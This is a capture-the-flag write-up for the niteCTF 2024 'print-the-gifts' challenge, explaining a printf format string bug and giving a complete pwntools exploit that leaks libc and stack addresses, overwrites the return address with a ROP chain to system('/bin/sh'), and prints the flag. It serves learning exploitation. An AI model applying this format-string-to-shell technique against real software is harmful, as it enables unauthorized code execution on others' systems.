# print-the-gifts

## Challenge description
Santa has come with a lot of gifts, do not exploit his kindess unless you want to end up on the naughty list...

```bash
$ checksec vuln
[*] '/home/coraline/CTF/work/pwn-writeups/nitectf24/print-the-gifts/chall'
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
    Stripped:   No
```

## Reverse

This is the reversed code (using Ghidra). I've cleaned it up a bit for readability.

```C
undefined8 main(void)

{
  char ans;
  char buf [104];
  
  setvbuf(stdin,(char *)0x0,2,0);
  setvbuf(stdout,(char *)0x0,2,0);
  
  while( true ) {
    ans = ' ';
    printf("What gift do you want from santa\n>");
    fgets(buf,100,stdin);
    printf("Santa brought you a ");
    printf(buf);
    puts("do you want another gift?\nEnter y or n:");
    __isoc99_scanf(&DAT_00102068,&ans);
    if (ans == 'n') break;
    getchar();
  }

  return 0;
}
```


## Where to begin

1. There's an obvious format string vulnerability at `printf(buf)`
2. The while loop lets us perform multiple format string payloads, which makes it easy for us

This is a pretty textbook format string challenge. As a high level overview, the format string vulnerability comes from passing in a user-controlled input into `printf`. The user can pass in format specifiers (like `%p`, `%s`, `%n`) of their choosing. This vulnerability allows you to leak register (on x86-64) and stack values, as well as perform arbitrary write via `%n` specifier.
## Setup

Since there's no defined `win` function that prints out the contents of the flag, the goal of this exploit is to spawn a shell. To do this, we'd first need to leak a libc address. Then, we need to somehow call `system` to get the shell.

Since there's GOT write protection (full RELRO), we won't be able to hijack program execution via GOT overwrite. The only other option is to overwrite return address, which means we'll also need a stack leak.

Now, there's two ways I thought to go about this.
1. Overwrite return address to a one gadget
2. ROP chain to call `system`

My go-to is always the one gadget route since it's the easiest, but for some reason I wasn't able to get it to work for this exploit even after satisfying all the constraints. I didn't care to debug / get it to work, so I ended up just doing ROP chain.
## Exploit

First, let's get the libc leak. This is pretty trivial since format string vulnerability let's us see values on the stack (and it'll almost always have libc pointers in them). For example, the return address for `main()` points to libc's `__libc_start_main`. We'll also need a stack leak which is also pretty easy since the stack often has pointers to other places in the stack.

When I'm looking for such leaks, I like to just print out a lot of values and pick out what I think are libc / stack addresses. Here, I'm using `%i$llx` to see the `i`th argument on the stack as a full 8-byte hex value.

```python
from pwn import *

context.terminal = ['tmux', 'splitw', '-v', '-p', '90']
context.arch = 'amd64'

PROG = './chall_patched'
elf = ELF(PROG)
libc = ELF('./libc.so.6')

### ------------------ EXPLOIT ------------------ ###

r = process(PROG)

pay = '.'.join([f'%{i}$llx' for i in range(20, 30)])
r.sendlineafter(b'>', pay.encode())
```

```bash
[+] Opening connection to print-the-gifts.chals.nitectf2024.live on port 1337: Done
[*] Switching to interactive mode
Santa brought you a 0.1389b31053c80800.1.7ffff7e0924a.7fffffffe400.555555555199.155554040.7fffffffe418.7fffffffe418.9fb4c0226f0b3bdf
do you want another gift?
Enter y or n:
$
```

Great, it looks like `7ffff7e0924a` is a libc address and `7fffffffe418` is a stack address. Now, it's important you cross verify with the remote server since the stack may look different on your local instance as it is on the server's (this is why I'm picking `7fffffffe418` as my stack leak over the `7fffffffe400`).

Now that I know which positional arguments to look at, I can modify the above payload to only have it output those 2 values.

```python
# pay = '.'.join([f'%{i}$llx' for i in range(20, 30)])
pay = b'%23$llx.%27$llx'
r.sendlineafter(b'>', pay)

# Parse stack and libc leak
r.recvuntil(b'you a ')
libc_leak = int(r.recvuntil(b'.')[:-1], 16)
stack_leak = int(r.recvline().strip(), 16)
log.info('Libc leak: ' + hex(libc_leak))
log.info('Stack leak: ' + hex(stack_leak))
```

Using these leaks, we can find libc base address and the return address of `main`. I found the offsets to retrieve those values using gdb:

```bash
pwndbg> vmmap
LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
             Start                End Perm     Size Offset File
(--snip--)
    0x7ffff7de2000     0x7ffff7e08000 r--p    26000      0 /home/coraline/CTF/work/pwn-writeups/nitectf24/pr
int-the-gifts/libc.so.6
(--snip (we only care about first libc.so.6 entry for base)-- )

## Calculate libc base offset from our leak ##
pwndbg> p/x 0x7ffff7e0924a - 0x7ffff7de2000
$2 = 0x2724a

# Calculate main's return address offset from our stack leak ##
pwndbg> retaddr
0x7fffffffdc88 —▸ 0x7ffff7e0924a ◂— mov edi, eax
(--snip--)
pwndbg> p/x 0x7fffffffdd98 - 0x7fffffffdc88
$3 = 0x110
```

```python
libc.address = libc_leak - 0x2724a
ret_addr = stack_leak - 0x110
log.info('Libc base: ' + hex(libc.address))
log.info('Ret addr: ' + hex(ret_addr))
```

Great! Onto the next step - we want to create an ROP chain to call `system('/bin/sh', 0, 0)`. As mentioned above, we can perform arbitrary write with a format string vulnerability by using the format specifier `%n`. This specifier writes over how many characters have been printed out thus far into the address pointed to by the argument. For example, `aaaa%8$n` writes `len('aaaa') = 4` to the address pointed to by the 8th argument (which lives on the stack). This is pretty powerful because the string `buf` is on the stack, so we can create pointers to anywhere.

Here's what we want our ROP chain to get `system('/bin/sh', 0, 0)`:
1. Set rdi = address to `'/bin/sh'` string
2. Set rsi = 0
3. Call `system`

Note, we don't need to set rdx (3rd argument) to 0 because it's already 0 by the time we return from main. 

To overwrite an address value, we'll use this formatted payload `%{i}c%{j}$hn`. Let's break this down:
- `%{i}c` will print out `i` characters to stdout
- `%{j}$hn` will overwrite the number of already printed out characters (in this case, `i`) into the `{j}` argument. `%hn` specifies that it will write just 2 bytes.
	- Because `buf` is on the stack, we can control the pointer to write to (i.e. we can control the value of `j`th argument)
- Example: `%{0xdead}c%10$hn` writes `*(10th arg) = 0xdead`

Since we'll be overwriting multiple addresses for the ROP chain, I've created a helper function for one arbitrary write payload:

```python
def mywrite(addr, val):
    fst = (val >> (8*4)) & 0xffff
    snd = (val >> (4*4)) & 0xffff
    thd = val & 0xffff
    for i, w in enumerate([thd, snd, fst]):
        r.sendlineafter(b'n:', b'y')
        pay = f'%{w}c%10$hn'
        pay += 'a' * (16-len(pay))
        pay = pay.encode()
        pay += p64(addr+(i*2))
        r.sendlineafter(b'>', pay)
```

We're writing 2 bytes at a time since it's generally infeasible to print out something like `0xdeadbeef` amount of characters. Notice, we're padding to length 16 before appending the pointer we want to write to. The position of this pointer is what `printf` interprets as the 10th argument, which is why we've set `%10$hn`. To find this exact offset, you can verify using `%{j}$llx` to see if the pointer is in fact in that correct position.

Now that we've setup our arbitrary write, let's make our ROP chain. ROP gadgets were retrieved using `ROPgadget`.

```python
# ROP 1: pop rdi <- /bin/sh
pop_rdi = libc.address + 0x277e5
mywrite(ret_addr, pop_rdi)

binsh = libc.address + 0x196031
mywrite(ret_addr+8, binsh)

# ROP 2: pop rsi <- 0
pop_rsi = libc.address + 0x28f99
mywrite(ret_addr+(8*2), pop_rsi)

# Write 0 to the address. Just remove the payload %c so that it prints no characters
curr = ret_addr+(8*3)
r.sendlineafter(b'n:', b'y')
pay = f'%10$lln'
pay += 'a' * (16-len(pay))
pay = pay.encode()
pay += p64(curr)
r.sendlineafter(b'>', pay)

# ROP 3: ret for 16 byte aligned
ret = libc.address + 0x26e99
mywrite(ret_addr+(8*4), ret)

# ROP 4: system
mywrite(ret_addr+(8*5), libc.sym['system'])

r.sendlineafter(b'n:', b'n')
r.interactive()
```

I had to add the extra `ret` in `ROP 3` above since the `system` call wasn't 16 byte aligned. Now you've got the shell :).

```bash
[*] '/home/coraline/CTF/work/pwn-writeups/nitectf24/print-the-gifts/chall_patched'
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
    RUNPATH:    b'.'
    Stripped:   No
[*] '/home/coraline/CTF/work/pwn-writeups/nitectf24/print-the-gifts/libc.so.6'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
[+] Opening connection to print-the-gifts.chals.nitectf2024.live on port 1337: Done
[*] Libc leak: 0x7f141132d24a
[*] Stack leak: 0x7fffebf4bb78
[*] Libc base: 0x7f1411306000
[*] Ret addr: 0x7fffebf4ba68
[*] Switching to interactive mode

$ ls
chall
flag.txt
$ cat flag.txt
nite{0nLy_n4ugHty_k1d5_Use_%n}
```

## Full Script

```python
from pwn import *

context.terminal = ['tmux', 'splitw', '-v', '-p', '90']
context.arch = 'amd64'

PROG = './chall_patched'
elf = ELF(PROG)
libc = ELF('./libc.so.6')

### ------------------ EXPLOIT ------------------ ###

r = remote('print-the-gifts.chals.nitectf2024.live', 1337, ssl=True)

# pay = '.'.join([f'%{i}$llx' for i in range(20, 30)])
pay = b'%23$llx.%27$llx'
r.sendlineafter(b'>', pay)

# Parse stack and libc leak
r.recvuntil(b'you a ')
libc_leak = int(r.recvuntil(b'.')[:-1], 16)
stack_leak = int(r.recvline().strip(), 16)
log.info('Libc leak: ' + hex(libc_leak))
log.info('Stack leak: ' + hex(stack_leak))

libc.address = libc_leak - 0x2724a
ret_addr = stack_leak - 0x110
log.info('Libc base: ' + hex(libc.address))
log.info('Ret addr: ' + hex(ret_addr))

def mywrite(addr, val):
    fst = (val >> (8*4)) & 0xffff
    snd = (val >> (4*4)) & 0xffff
    thd = val & 0xffff
    for i, w in enumerate([thd, snd, fst]):
        r.sendlineafter(b'n:', b'y')
        pay = f'%{w}c%10$hn'
        pay += 'a' * (16-len(pay))
        pay = pay.encode()
        pay += p64(addr+(i*2))
        r.sendlineafter(b'>', pay)

# ROP 1: pop rdi <- /bin/sh
pop_rdi = libc.address + 0x277e5
mywrite(ret_addr, pop_rdi)

binsh = libc.address + 0x196031
mywrite(ret_addr+8, binsh)

# ROP 2: pop rsi <- 0
pop_rsi = libc.address + 0x28f99
mywrite(ret_addr+(8*2), pop_rsi)

curr = ret_addr+(8*3)
r.sendlineafter(b'n:', b'y')
pay = f'%10$lln'
pay += 'a' * (16-len(pay))
pay = pay.encode()
pay += p64(curr)
r.sendlineafter(b'>', pay)

# ROP 3: ret for 16 byte aligned
ret = libc.address + 0x26e99
mywrite(ret_addr+(8*4), ret)

# ROP 4: system
mywrite(ret_addr+(8*5), libc.sym['system'])

r.sendlineafter(b'n:', b'n')
r.interactive()
# nite{0nLy_n4ugHty_k1d5_Use_%n}
```